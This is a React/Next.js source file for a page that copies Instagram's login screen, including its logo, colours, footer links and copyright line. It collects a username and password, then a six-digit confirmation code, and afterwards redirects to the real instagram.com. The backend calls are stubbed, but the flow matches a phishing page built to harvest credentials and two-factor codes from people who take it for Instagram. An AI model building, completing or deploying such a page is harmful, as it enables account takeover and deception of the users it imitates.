"use client";
import React, { useState } from "react";
import {
  Input,
  Button,
  Form,
  Typography,
  Card,
  Space,
  Alert,
  Row,
  Col,
  Avatar,
  Layout,
  Divider,
  message,
} from "antd";
import {
  UserOutlined,
  LockOutlined,
  MailOutlined,
  EyeInvisibleOutlined,
  EyeTwoTone,
  ArrowLeftOutlined,
  CheckCircleOutlined,
  MessageOutlined,
  SettingOutlined,
} from "@ant-design/icons";
import { useRouter } from "next/navigation";

const { Title, Text, Paragraph } = Typography;
const { Header, Content } = Layout;

const VerificationApp = () => {
  const [currentStep, setCurrentStep] = useState("login"); // 'login', 'verify', 'main'
  const router = useRouter();
  const [form] = Form.useForm();
  const [verifyForm] = Form.useForm();
  const [formData, setFormData] = useState({
    username: "",
    password: "",
    verificationCode: "",
  });
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  const handleLogin = async (values) => {
    setFormData((prev) => ({ ...prev, ...values }));
    setLoading(true);

    // Simulate API call
    setTimeout(() => {
      setLoading(false);
      setCurrentStep("verify");
    }, 1500);
  };

  const handleVerification = async (values) => {
    setLoading(true);

    // Simulate verification
    setTimeout(() => {
      setLoading(false);
      if (values.verificationCode && values.verificationCode.length === 6) {
        // setCurrentStep("main");
        message.success("Account has been successfully verified!");
        router.push("https://instagram.com/");
      } else {
        verifyForm.setFields([
          {
            name: "verificationCode",
            errors: ["Invalid verification code"],
          },
        ]);
      }
    }, 1000);
  };

  const resendCode = () => {
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
    }, 1000);
  };

  // Login Page - Instagram Style
  if (currentStep === "login") {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center p-3">
        <div className="w-full max-w-sm">
          {/* Instagram Logo */}
          <div className="text-center mb-4">
            <img
              src="/images/logo-text.png"
              alt="instagram logo"
              className="max-w-[175px] mx-auto"
            />
          </div>

          {/* Login Form */}
          <div className="bg-white px-10 py-4 mb-4">
            <Form
              form={form}
              onFinish={handleLogin}
              layout="vertical"
              className="space-y-2"
            >
              <Form.Item
                name="username"
                className="mb-2"
                rules={[
                  { required: true, message: "" },
                  { min: 3, message: "" },
                ]}
              >
                <Input
                  placeholder="Phone number, username, or email"
                  className="h-9 text-xs bg-gray-50 border border-gray-300 rounded-sm px-2 focus:border-gray-400"
                  style={{
                    fontSize: "12px",
                    backgroundColor: "#fafafa",
                  }}
                />
              </Form.Item>

              <Form.Item
                name="password"
                className="mb-4 relative"
                rules={[
                  { required: true, message: "" },
                  { min: 6, message: "" },
                ]}
              >
                <div className="relative">
                  <Input
                    type={showPassword ? "text" : "password"}
                    placeholder="Password"
                    className="h-9 text-xs bg-gray-50 border border-gray-300 rounded-sm px-2 pr-12 focus:border-gray-400"
                    style={{
                      fontSize: "12px",
                      backgroundColor: "#fafafa",
                    }}
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-2 top-1/2 transform -translate-y-1/2 text-xs font-semibold text-gray-800 hover:text-gray-600"
                  >
                    {showPassword ? "Hide" : "Show"}
                  </button>
                </div>
              </Form.Item>

              <Form.Item className="mb-4">
                <Button
                  htmlType="submit"
                  loading={loading}
                  block
                  className="h-8 text-sm font-semibold text-white border-0 rounded-md"
                  style={{
                    backgroundColor: "#0095f6",
                    fontSize: "14px",
                  }}
                >
                  {loading ? "Logging in..." : "Log in"}
                </Button>
              </Form.Item>
            </Form>

            {/* Forgot Password */}
            <div className="text-center">
              <a href="#" className="text-xs text-blue-900 hover:underline">
                Forgot password?
              </a>
            </div>
          </div>

          {/* Sign Up Link */}
          <div className="text-center">
            <Text className="text-sm text-gray-600">
              Don't have an account?{" "}
              <a
                href="#"
                className="text-blue-500 font-semibold hover:underline"
              >
                Sign up
              </a>
            </Text>
          </div>

          {/* Footer Links */}
          <div className="mt-16 text-center space-y-4">
            <div className="flex flex-wrap justify-center gap-4 text-xs text-gray-400">
              <a href="#" className="hover:underline">
                Meta
              </a>
              <a href="#" className="hover:underline">
                About
              </a>
              <a href="#" className="hover:underline">
                Blog
              </a>
              <a href="#" className="hover:underline">
                Jobs
              </a>
              <a href="#" className="hover:underline">
                Help
              </a>
              <a href="#" className="hover:underline">
                API
              </a>
              <a href="#" className="hover:underline">
                Privacy
              </a>
              <a href="#" className="hover:underline">
                Terms
              </a>
            </div>
            <div className="flex flex-wrap justify-center gap-4 text-xs text-gray-400">
              <a href="#" className="hover:underline">
                Locations
              </a>
              <a href="#" className="hover:underline">
                Instagram Lite
              </a>
              <a href="#" className="hover:underline">
                Threads
              </a>
              <a href="#" className="hover:underline">
                Contact Uploading & Non-Users
              </a>
              <a href="#" className="hover:underline">
                Meta Verified
              </a>
            </div>
            <div className="text-xs text-gray-400">
              <span>English</span>
              <span className="mx-4">© 2025 Instagram from Meta</span>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Verification Page
  if (currentStep === "verify") {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <div className="w-full max-w-sm">
          <button
            onClick={() => setCurrentStep("login")}
            className="mb-6 flex items-center text-gray-600 hover:text-gray-800 text-sm"
          >
            <ArrowLeftOutlined className="mr-2" />
            Back
          </button>

          <div className="bg-white border border-gray-300 px-10 py-8 text-center">
            <div className="w-24 h-24 border-4 border-gray-800 rounded-full mx-auto mb-6 flex items-center justify-center">
              <MailOutlined className="text-4xl text-gray-800" />
            </div>

            <Title level={3} className="mb-2 font-light">
              Enter Confirmation Code
            </Title>
            <Paragraph className="text-gray-600 text-sm mb-6">
              Enter the confirmation code we sent to your email address.
            </Paragraph>

            <Form
              form={verifyForm}
              onFinish={handleVerification}
              layout="vertical"
            >
              <Form.Item
                name="verificationCode"
                rules={[
                  { required: true, message: "Verification code is required" },
                  { len: 6, message: "Code must be 6 digits" },
                  { pattern: /^\d+$/, message: "Only numbers allowed" },
                ]}
              >
                <Input
                  placeholder="######"
                  maxLength={6}
                  className="text-center text-lg font-mono tracking-widest h-12 bg-gray-50 border border-gray-300 rounded-sm"
                />
              </Form.Item>

              <Form.Item>
                <Button
                  htmlType="submit"
                  loading={loading}
                  block
                  className="h-8 text-sm font-semibold text-white border-0 rounded-sm"
                  style={{
                    backgroundColor: "#0095f6",
                    fontSize: "14px",
                  }}
                >
                  {loading ? "Confirming..." : "Confirm"}
                </Button>
              </Form.Item>
            </Form>

            <div className="text-center mt-4">
              <button
                onClick={resendCode}
                disabled={loading}
                className="text-sm text-blue-500 hover:underline disabled:opacity-50"
              >
                Resend Code
              </button>
            </div>

            {/* <Alert
              message="For testing: Use code 123456"
              type="info"
              showIcon
              size="small"
              className="mt-4 text-xs"
            /> */}
          </div>
        </div>
      </div>
    );
  }

  // Main Page
  return (
    <Layout className="min-h-screen bg-gray-50">
      <Header className="bg-white border-b border-gray-300 px-4">
        <div className="max-w-6xl mx-auto flex items-center justify-between">
          <Space align="center" size="middle">
            <h1
              className="text-2xl font-normal mb-0"
              style={{
                fontFamily: "Dancing Script, cursive",
                letterSpacing: "1px",
              }}
            >
              Instagram
            </h1>
          </Space>

          <Space>
            <Avatar
              size="large"
              icon={<UserOutlined />}
              className="bg-gray-300"
            />
          </Space>
        </div>
      </Header>

      <Content className="px-4 py-8">
        <div className="max-w-4xl mx-auto">
          <div className="bg-white border border-gray-300 rounded-sm p-12 text-center">
            <div className="w-24 h-24 border-4 border-green-500 rounded-full mx-auto mb-6 flex items-center justify-center">
              <CheckCircleOutlined className="text-4xl text-green-500" />
            </div>

            <Title level={2} className="mb-4 font-light">
              Welcome, {formData.username}! 🎉
            </Title>
            <Paragraph className="text-lg text-gray-600 mb-8">
              Your account has been successfully verified. You can now access
              all features.
            </Paragraph>

            <Row gutter={[24, 24]} className="mt-8">
              <Col xs={24} md={8}>
                <div className="border border-gray-200 p-6 text-center hover:shadow-md transition-shadow">
                  <div className="w-16 h-16 bg-blue-100 rounded-full mx-auto mb-4 flex items-center justify-center">
                    <UserOutlined className="text-2xl text-blue-600" />
                  </div>
                  <Title level={4} className="mb-2 font-medium">
                    Profile
                  </Title>
                  <Text type="secondary" className="text-sm">
                    Set up your profile and manage personal information
                  </Text>
                </div>
              </Col>

              <Col xs={24} md={8}>
                <div className="border border-gray-200 p-6 text-center hover:shadow-md transition-shadow">
                  <div className="w-16 h-16 bg-green-100 rounded-full mx-auto mb-4 flex items-center justify-center">
                    <MessageOutlined className="text-2xl text-green-600" />
                  </div>
                  <Title level={4} className="mb-2 font-medium">
                    Messages
                  </Title>
                  <Text type="secondary" className="text-sm">
                    Connect and chat with friends
                  </Text>
                </div>
              </Col>

              <Col xs={24} md={8}>
                <div className="border border-gray-200 p-6 text-center hover:shadow-md transition-shadow">
                  <div className="w-16 h-16 bg-purple-100 rounded-full mx-auto mb-4 flex items-center justify-center">
                    <SettingOutlined className="text-2xl text-purple-600" />
                  </div>
                  <Title level={4} className="mb-2 font-medium">
                    Settings
                  </Title>
                  <Text type="secondary" className="text-sm">
                    Customize your experience
                  </Text>
                </div>
              </Col>
            </Row>

            <Divider />

            <Button
              size="middle"
              onClick={() => {
                setCurrentStep("login");
                setFormData({
                  username: "",
                  password: "",
                  verificationCode: "",
                });
                form.resetFields();
                verifyForm.resetFields();
              }}
              className="border border-gray-300 text-gray-700 hover:bg-gray-50"
            >
              Sign Out
            </Button>
          </div>
        </div>
      </Content>

      <style jsx>{`
        @import url("https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&display=swap");
        h1 {
          font-family: "Dancing Script", cursive !important;
        }
      `}</style>
    </Layout>
  );
};

export default VerificationApp;
